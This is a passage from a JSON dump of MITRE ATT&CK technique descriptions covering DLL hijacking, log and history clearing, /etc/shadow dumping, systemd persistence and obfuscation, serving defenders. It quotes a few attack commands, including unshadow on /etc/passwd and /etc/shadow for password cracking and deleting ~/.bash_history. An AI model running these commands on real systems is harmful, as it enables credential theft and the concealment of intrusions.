loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.\\n\\nThere are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program. Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. (Citation: Microsoft Security Advisory 2269637)\\n\\nAdversaries may also directly modify the way a program loads DLLs by replacing an existing DLL or modifying a .manifest or .local redirection file, directory, or junction to cause the program to load a different DLL. (Citation: Microsoft Dynamic-Link Library Redirection) (Citation: Microsoft Manifests) (Citation: FireEye DLL Search Order Hijacking)\\n\\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program.\\nPrograms that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.\", \"id\": \"attack-pattern--2fee9321-3e71-4cf4-af24-d4d40d355b34\"}, \"attack-pattern--a9d4b653-6915-42af-98b2-5758c4ceee56\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-09T14:15:05.330Z\", \"name\": \"Unix Shell\", \"attack_pattern_identifier\": \"T1059.004\", \"description\": \"Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux and macOS systems, though many variations of the Unix shell exist (e.g. sh, bash, zsh, etc.) depending on the specific OS or distribution.(Citation: DieNet Bash)(Citation: Apple ZShell) Unix shells can control every aspect of a system, with certain commands requiring elevated privileges.\\n\\nUnix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\\n\\nAdversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with [SSH](https://attack.mitre.org/techniques/T1021/004). Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence.\", \"modified\": \"2020-06-15T16:55:44.483Z\", \"id\": \"attack-pattern--a9d4b653-6915-42af-98b2-5758c4ceee56\"}, \"attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-01-28T17:11:54.034Z\", \"name\": \"Clear Linux or Mac System Logs\", \"attack_pattern_identifier\": \"T1070.002\", \"description\": \"Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\\n\\n* <code>/var/log/messages:</code>: General and system-related messages\\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\\n* <code>/var/log/kern.log</code>: Kernel logs\\n* <code>/var/log/cron.log</code>: Crond logs\\n* <code>/var/log/maillog</code>: Mail server logs\\n* <code>/var/log/httpd/</code>: Web server access and error logs\\n\", \"modified\": \"2020-03-29T21:23:51.886Z\", \"id\": \"attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36\"}, \"attack-pattern--32ad5c86-2bcf-47d8-8fdc-d7f3d79a7490\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-02T14:30:05.252Z\", \"name\": \"Runtime Data Manipulation\", \"attack_pattern_identifier\": \"T1565.003\", \"modified\": \"2020-03-28T23:10:34.359Z\", \"description\": \"Adversaries may modify systems in order to manipulate the data as it is accessed and displayed to an end user.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating runtime data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\\n\\nAdversaries may alter application binaries used to display data in order to cause runtime manipulations. Adversaries may also conduct [Change Default File Association](https://attack.mitre.org/techniques/T1546/001) and [Masquerading](https://attack.mitre.org/techniques/T1036) to cause a similar effect. The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.\", \"id\": \"attack-pattern--32ad5c86-2bcf-47d8-8fdc-d7f3d79a7490\"}, \"attack-pattern--f1951e8a-500e-4a26-8803-76d95c4554b4\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-10T18:33:36.159Z\", \"name\": \"Service Execution\", \"attack_pattern_identifier\": \"T1569.002\", \"modified\": \"2020-03-28T18:52:02.384Z\", \"description\": \"Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (<code>services.exe</code>) is an interface to manage and manipulate services.(Citation: Microsoft Service Control Manager) The service control manager is accessible to users via GUI components as well as system utilities such as <code>sc.exe</code> and [Net](https://attack.mitre.org/software/S0039).\\n\\n[PsExec](https://attack.mitre.org/software/S0029) can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API.(Citation: Russinovich Sysinternals)\\n\\nAdversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with [Windows Service](https://attack.mitre.org/techniques/T1543/003) during service persistence or privilege escalation.\", \"id\": \"attack-pattern--f1951e8a-500e-4a26-8803-76d95c4554b4\"}, \"attack-pattern--d157f9d2-d09a-4efa-bb2a-64963f94e253\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-03-10T18:23:06.482Z\", \"name\": \"System Services\", \"attack_pattern_identifier\": \"T1569\", \"description\": \"Adversaries may abuse system services or daemons to execute commands or programs. Adversaries can execute malicious content by interacting with or creating services. Many services are set to run at boot, which can aid in achieving persistence ([Create or Modify System Process](https://attack.mitre.org/techniques/T1543)), but adversaries can also abuse services for one-time or temporary execution.\", \"modified\": \"2020-06-08T23:28:29.250Z\", \"id\": \"attack-pattern--d157f9d2-d09a-4efa-bb2a-64963f94e253\"}, \"attack-pattern--d0b4fcdb-d67d-4ed2-99ce-788b12f8c0f4\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-11T18:46:56.263Z\", \"name\": \"/etc/passwd and /etc/shadow\", \"attack_pattern_identifier\": \"T1003.008\", \"description\": \"Adversaries may attempt to dump the contents of <code>/etc/passwd</code> and <code>/etc/shadow</code> to enable offline password cracking. Most modern Linux operating systems use a combination of <code>/etc/passwd</code> and <code>/etc/shadow</code> to store user account information including password hashes in <code>/etc/shadow</code>. By default, <code>/etc/shadow</code> is only readable by the root user.(Citation: Linux Password and Shadow File Formats)\\n\\nThe Linux utility, unshadow, can be used to combine the two files in a format suited for password cracking utilities such as John the Ripper:(Citation: nixCraft - John the Ripper) <code># /usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db</code>\\n\", \"modified\": \"2020-03-20T15:56:55.022Z\", \"id\": \"attack-pattern--d0b4fcdb-d67d-4ed2-99ce-788b12f8c0f4\"}, \"attack-pattern--457c7820-d331-465a-915e-42f85500ccc4\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2018-04-18T17:59:24.739Z\", \"name\": \"Signed Binary Proxy Execution\", \"attack_pattern_identifier\": \"T1218\", \"description\": \"Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed binaries. Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files.\", \"modified\": \"2020-10-21T18:37:15.275Z\", \"id\": \"attack-pattern--457c7820-d331-465a-915e-42f85500ccc4\"}, \"attack-pattern--7dd95ff6-712e-4056-9626-312ea4ab4c5e\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:58.938Z\", \"name\": \"Data Staged\", \"attack_pattern_identifier\": \"T1074\", \"description\": \"Adversaries may stage collected data in a central location or directory prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.(Citation: PWC Cloud Hopper April 2017)\\n\\nIn cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and stage data in that instance.(Citation: Mandiant M-Trends 2020)\\n\\nAdversaries may choose to stage data from a victim network in a centralized location prior to Exfiltration to minimize the number of connections made to their C2 server and better evade detection.\", \"modified\": \"2020-09-14T19:48:08.180Z\", \"id\": \"attack-pattern--7dd95ff6-712e-4056-9626-312ea4ab4c5e\"}, \"attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2018-04-18T17:59:24.739Z\", \"name\": \"Exploit Public-Facing Application\", \"attack_pattern_identifier\": \"T1190\", \"description\": \"Adversaries may attempt to take advantage of a weakness in an Internet-facing computer or program using software, data, or commands in order to cause unintended or unanticipated behavior. The weakness in the system can be a bug, a glitch, or a design vulnerability. These applications are often websites, but can include databases (like SQL)(Citation: NVD CVE-2016-6662), standard services (like SMB(Citation: CIS Multiple SMB Vulnerabilities) or SSH), network device administration and management protocols (like SNMP and Smart Install(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)), and any other applications with Internet accessible open sockets, such as web servers and related services.(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may include [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211). \\n\\nIf an application is hosted on cloud-based infrastructure, then exploiting it may lead to compromise of the underlying instance. This can allow an adversary a path to access the cloud APIs or to take advantage of weak identity and access management policies.\\n\\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)\", \"modified\": \"2020-10-21T01:10:54.358Z\", \"id\": \"attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c\"}, \"attack-pattern--53ac20cd-aca3-406e-9aa0-9fc7fdc60a5a\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-02-20T20:53:45.725Z\", \"name\": \"Archive Collected Data\", \"attack_pattern_identifier\": \"T1560\", \"description\": \"An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network. Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.\\n\\nBoth compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method.\", \"modified\": \"2020-10-21T16:36:55.831Z\", \"id\": \"attack-pattern--53ac20cd-aca3-406e-9aa0-9fc7fdc60a5a\"}, \"attack-pattern--e3b6daca-e963-4a69-aee6-ed4fd653ad58\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2019-09-16T17:52:44.147Z\", \"name\": \"Software Discovery\", \"attack_pattern_identifier\": \"T1518\", \"description\": \"Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from [Software Discovery](https://attack.mitre.org/techniques/T1518) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\\n\\nAdversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).\", \"modified\": \"2020-09-16T19:36:17.133Z\", \"id\": \"attack-pattern--e3b6daca-e963-4a69-aee6-ed4fd653ad58\"}, \"attack-pattern--2db31dcd-54da-405d-acef-b9129b816ed6\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-11T18:27:15.774Z\", \"name\": \"SSH\", \"attack_pattern_identifier\": \"T1021.004\", \"description\": \"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user.\\n\\nSSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the user\\u2019s public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user.(Citation: SSH Secure Shell)\", \"modified\": \"2020-03-23T23:43:46.977Z\", \"id\": \"attack-pattern--2db31dcd-54da-405d-acef-b9129b816ed6\"}, \"attack-pattern--22905430-4901-4c2a-84f6-98243cb173f8\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-02-26T17:41:25.933Z\", \"name\": \"Hide Artifacts\", \"attack_pattern_identifier\": \"T1564\", \"description\": \"Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.(Citation: Sofacy Komplex Trojan)(Citation: Cybereason OSX Pirrit)(Citation: MalwareBytes ADS July 2015)\\n\\nAdversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.(Citation: Sophos Ragnar May 2020)\", \"modified\": \"2020-09-23T11:31:50.636Z\", \"id\": \"attack-pattern--22905430-4901-4c2a-84f6-98243cb173f8\"}, \"attack-pattern--3fc9b85a-2862-4363-a64d-d692e3ffbee0\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-02-11T18:48:28.456Z\", \"name\": \"Credentials from Password Stores\", \"attack_pattern_identifier\": \"T1555\", \"modified\": \"2020-03-25T18:40:15.564Z\", \"description\": \"Adversaries may search for common password storage locations to obtain user credentials. Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. There are also specific applications that store passwords to make it easier for users manage and maintain. Once credentials are obtained, they can be used to perform lateral movement and access restricted information.\", \"id\": \"attack-pattern--3fc9b85a-2862-4363-a64d-d692e3ffbee0\"}, \"attack-pattern--7e150503-88e7-4861-866b-ff1ac82c4475\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:45.139Z\", \"name\": \"System Network Connections Discovery\", \"attack_pattern_identifier\": \"T1049\", \"description\": \"Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. \\n\\nAn adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate.(Citation: Amazon AWS VPC Guide)(Citation: Microsoft Azure Virtual Network Overview)(Citation: Google VPC Overview)\\n\\nUtilities and commands that acquire this information include [netstat](https://attack.mitre.org/software/S0104), \\\"net use,\\\" and \\\"net session\\\" with [Net](https://attack.mitre.org/software/S0039). In Mac and Linux, [netstat](https://attack.mitre.org/software/S0104) and <code>lsof</code> can be used to list current connections. <code>who -a</code> and <code>w</code> can be used to show which users are currently logged in, similar to \\\"net session\\\".\", \"modified\": \"2020-03-15T14:15:32.910Z\", \"id\": \"attack-pattern--7e150503-88e7-4861-866b-ff1ac82c4475\"}, \"attack-pattern--b18eae87-b469-4e14-b454-b171b416bc18\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-03-14T18:18:32.443Z\", \"name\": \"Non-Standard Port\", \"attack_pattern_identifier\": \"T1571\", \"description\": \"Adversaries may communicate using a protocol and port paring that are typically not associated. For example, HTTPS over port 8088(Citation: Symantec Elfin Mar 2019) or port 587(Citation: Fortinet Agent Tesla April 2018) as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.\", \"modified\": \"2020-03-26T22:02:25.221Z\", \"id\": \"attack-pattern--b18eae87-b469-4e14-b454-b171b416bc18\"}, \"attack-pattern--72b74d71-8169-42aa-92e0-e7b04b9f5a08\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:31:06.988Z\", \"name\": \"Account Discovery\", \"attack_pattern_identifier\": \"T1087\", \"description\": \"Adversaries may attempt to get a listing of accounts on a system or within an environment. This information can help adversaries determine which accounts exist to aid in follow-on behavior.\", \"modified\": \"2020-09-16T15:10:18.260Z\", \"id\": \"attack-pattern--72b74d71-8169-42aa-92e0-e7b04b9f5a08\"}, \"attack-pattern--1cfcb312-b8d7-47a4-b560-4b16cc677292\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-02T14:22:24.410Z\", \"name\": \"Stored Data Manipulation\", \"attack_pattern_identifier\": \"T1565.001\", \"description\": \"Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\\n\\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.\", \"modified\": \"2020-03-02T15:17:40.505Z\", \"id\": \"attack-pattern--1cfcb312-b8d7-47a4-b560-4b16cc677292\"}, \"attack-pattern--3aef9463-9a7a-43ba-8957-a867e07c1e6a\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-01-31T12:32:08.228Z\", \"name\": \"Clear Command History\", \"attack_pattern_identifier\": \"T1070.003\", \"description\": \"In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.\\n\\nOn Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions.\\n\\nAdversaries may delete their commands from these logs by manually clearing the history (<code>history -c</code>) or deleting the bash history file <code>rm ~/.bash_history</code>.\\n\\nOn Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the <code>PSReadLine</code> module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.\\n\\nThe <code>PSReadLine</code> command history tracks the commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\\\Microsoft\\\\Windows\\\\PowerShell\\\\PSReadLine\\\\ConsoleHost_history.txt</code> by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.(Citation: Microsoft PowerShell Command History)\\n\\nAdversaries may run the PowerShell command <code>Clear-History</code> to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the <code>ConsoleHost_history.txt</code> file. Adversaries may also delete the <code>ConsoleHost_history.txt</code> file or edit its contents to hide PowerShell commands they have run.(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)\", \"modified\": \"2020-10-16T18:09:48.686Z\", \"id\": \"attack-pattern--3aef9463-9a7a-43ba-8957-a867e07c1e6a\"}, \"attack-pattern--dfefe2ed-4389-4318-8762-f0272b350a1b\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-01-17T16:15:19.870Z\", \"name\": \"Systemd Service\", \"attack_pattern_identifier\": \"T1543.002\", \"description\": \"Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. The systemd service manager is commonly used for managing background daemon processes (also known as services) and other system resources.(Citation: Linux man-pages: systemd January 2014)(Citation: Freedesktop.org Linux systemd 29SEP2018) Systemd is the default initialization (init) system on many Linux distributions starting with Debian 8, Ubuntu 15.04, CentOS 7, RHEL 7, Fedora 15, and replaces legacy init systems including SysVinit and Upstart while remaining backwards compatible with the aforementioned init systems.\\n\\nSystemd utilizes configuration files known as service units to control how services boot and under what conditions. By default, these unit files are stored in the <code>/etc/systemd/system</code> and <code>/usr/lib/systemd/system</code> directories and have the file extension <code>.service</code>. Each service unit file may contain numerous directives that can execute system commands:\\n\\n* ExecStart, ExecStartPre, and ExecStartPost directives cover execution of commands when a services is started manually by 'systemctl' or on system start if the service is set to automatically start. \\n* ExecReload directive covers when a service restarts. \\n* ExecStop and ExecStopPost directives cover when a service is stopped or manually by 'systemctl'.\\n\\nAdversaries have used systemd functionality to establish persistent access to victim systems by creating and/or modifying service unit files that cause systemd to execute malicious commands at system boot.(Citation: Anomali Rocke March 2019)\\n\\nWhile adversaries typically require root privileges to create/modify service unit files in the <code>/etc/systemd/system</code> and <code>/usr/lib/systemd/system</code> directories, low privilege users can create/modify service unit files in directories such as <code>~/.config/systemd/user/</code> to achieve user-level persistence.(Citation: Rapid7 Service Persistence 22JUNE2016)\", \"modified\": \"2020-10-09T13:46:29.701Z\", \"id\": \"attack-pattern--dfefe2ed-4389-4318-8762-f0272b350a1b\"}, \"attack-pattern--ec8fc7e2-b356-455c-8db5-2e37be158e7d\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-26T17:46:13.128Z\", \"name\": \"Hidden Files and Directories\", \"attack_pattern_identifier\": \"T1564.001\", \"description\": \"Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a \\u2018hidden\\u2019 file. These files don\\u2019t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (<code>dir /a</code> for Windows and <code>ls \\u2013a</code> for Linux and macOS).\\n\\nOn Linux and Mac, users can mark specific files as hidden simply by putting a \\u201c.\\u201d as the first character in the file or folder name  (Citation: Sofacy Komplex Trojan) (Citation: Antiquated Mac Malware). Files and folders that start with a period, \\u2018.\\u2019, are by default hidden from being viewed in the Finder application and standard command-line utilities like \\u201cls\\u201d. Users must specifically change settings to have these files viewable.\\n\\nFiles on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app (Citation: WireLurker). On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn\\u2019t clutter up the user\\u2019s workspace. For example, SSH utilities create a .ssh folder that\\u2019s hidden and contains the user\\u2019s known hosts and keys.\\n\\nAdversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.\", \"modified\": \"2020-03-29T22:32:25.985Z\", \"id\": \"attack-pattern--ec8fc7e2-b356-455c-8db5-2e37be158e7d\"}, \"attack-pattern--b3d682b6-98f2-4fb0-aa3b-b4df007ca70a\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:32.662Z\", \"name\": \"Obfuscated Files or Information\", \"attack_pattern_identifier\": \"T1027\", \"description\": \"Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \\n\\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as JavaScript. \\n\\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)\\n\\nAdversaries may also obfuscate commands executed from payloads or directly via a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017) \", \"modified\": \"2020-09-16T19:24:20.601Z\", \"id\": \"attack-pattern--b3d682b6-98f2-4fb0-aa3b-b4df007ca70a\"}, \"attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:31:16.408Z\", \"name\": \"Ingress Tool Transfer\", \"attack_pattern_identifier\": \"T1105\", \"modified\": \"2020-03-20T15:42:48.595Z\", \"description\": \"Adversaries may transfer tools or other files from an external system into a compromised environment. Files may be copied from an external adversary controlled system through the command and control channel to bring tools into the victim network or through alternate protocols with another tool such as FTP. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.\", \"id\": \"attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add\"}, \"attack-pattern--03d7999c-1f4c-42cc-8373-e7690d318104\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:35.733Z\", \"name\": \"System Owner/User Discovery\", \"attack_pattern_identifier\": \"T1033\", \"modified\": \"2020-03-15T01:03:47.866Z\", \"description\": \"Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\\n\\nUtilities and commands that acquire this information include <code>whoami</code>. In Mac and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>.\", \"id\": \"attack-pattern--03d7999c-1f4c-42cc-8373-e7690d318104\"}, \"attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:41.399Z\", \"name\": \"Network Sniffing\", \"attack_pattern_identifier\": \"T1040\", \"modified\": \"2020-03-25T21:03:49.610Z\", \"description\": \"Adversaries may sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\\n\\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\\n\\nNetwork sniffing may also reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent Lateral Movement and/or Defense Evasion activities.\", \"id\": \"attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529\"}, \"attack-pattern--1608f3e1-598a-42f4-a01a-2e252e81728f\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:31:25.454Z\", \"name\": \"Email Collection\", \"attack_pattern_identifier\": \"T1114\", \"description\": \"Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Adversaries can collect or forward email from mail servers or clients. \", \"modified\": \"2020-03-24T18:31:06.417Z\", \"id\": \"attack-pattern--1608f3e1-598a-42f4-a01a-2e252e81728f\"}, \"attack-pattern--deb98323-e13f-4b0c-8d94-175379069062\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-05T14:17:46.686Z\", \"name\": \"Software Packing\", \"attack_pattern_identifier\": \"T1027.002\", \"description\": \"Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.(Citation: ESET FinFisher Jan 2018) \\n\\nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, (Citation: Wikipedia Exe Compression) but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.  \", \"modified\": \"2020-02-05T20:05:41.548Z\", \"id\": \"attack-pattern--deb98323-e13f-4b0c-8d94-175379069062\"}, \"attack-pattern--355be19c-ffc9-46d5-8d50-d6a036c675b6\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:56.776Z\", \"name\": \"Application Layer Protocol\", \"attack_pattern_identifier\": \"T1071\", \"description\": \"Adversaries may communicate using application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \\n\\nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. \", \"modified\": \"2020-10-21T16:35:45.986Z\", \"id\": \"attack-pattern--355be19c-ffc9-46d5-8d50-d6a036c675b6\"}, \"attack-pattern--830c9528-df21-472c-8c14-a036bf17d665\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:31:13.915Z\", \"name\": \"Web Service\", \"attack_pattern_identifier\": \"T1102\", \"modified\": \"2020-03-26T23:26:10.297Z\", \"description\": \"Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\\n\\nUse of Web services may also protect back-end C2 